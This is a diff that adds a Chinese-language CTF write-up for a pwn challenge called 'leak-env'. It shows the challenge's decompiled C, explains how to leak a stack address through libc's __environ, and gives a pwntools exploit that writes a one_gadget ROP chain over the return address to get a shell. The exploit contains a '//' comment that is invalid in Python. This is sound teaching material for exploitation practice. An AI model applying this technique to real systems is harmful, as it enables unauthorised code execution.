@@ -569,6 +569,61 @@ io.interactive()
 
 ```
 
+### [Week2] leak-env
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  void *buf[2]; // [rsp+0h] [rbp-10h] BYREF
+
+  buf[1] = (void *)__readfsqword(0x28u);
+  bufinit(argc, argv, envp);
+  printf("Here's your gift: %p\n", &printf);
+  puts("You have a chance to arbitrary read 8 bytes.");
+  printf("Where do you want to read?");
+  __isoc99_scanf("%p", buf);
+  printf("Here you are: ");
+  write(1, buf[0], 8uLL);
+  putchar(10);
+  puts("Now show me your magic.");
+  printf("Where do you want to place it?");
+  __isoc99_scanf("%p", buf);
+  puts("Now place it.");
+  read(0, buf[0], 0x30uLL);
+  printf("Good luck!");
+  return 0;
+}
+```
+
+题目提供了 libc 的地址，需要得到栈的地址来实现栈溢出。这里通过 libc 中的 __environ 环境变量来得到栈地址。
+
+__environ 是一个全局变量，他是一个环境变量数组，其指向的数据在栈上，可以通过这种方法得到栈的地址。
+
+```python
+from pwn import *
+
+context(arch="amd64", os="linux", log_level="debug")
+
+libc = ELF("../dist/libc.so.6")
+io = gdb.debug("./leakenv")
+
+io.recvuntil(b"Here's your gift: ")
+libc.address = eval(io.recvline()[:-1])-libc.sym.printf
+environ = libc.sym.__environ
+io.sendlineafter(b"Where do you want to read?", hex(environ))
+io.recvuntil(b"Here you are: ")
+stack = u64(io.recv(8))
+ret = stack-0x100
+io.sendlineafter(b"Where do you want to place it?", hex(ret))
+io.sendafter(b"Now place it.", flat([
+    libc.address+0x23b63, 0, 0, 0, 0,  // r12 must be NULL
+    libc.address+0xe3afe,              // one_gadget
+]))
+
+io.interactive()
+
+```
+
 ### [Week3] all-in-files
 
 > 一切皆文件是一种哲学
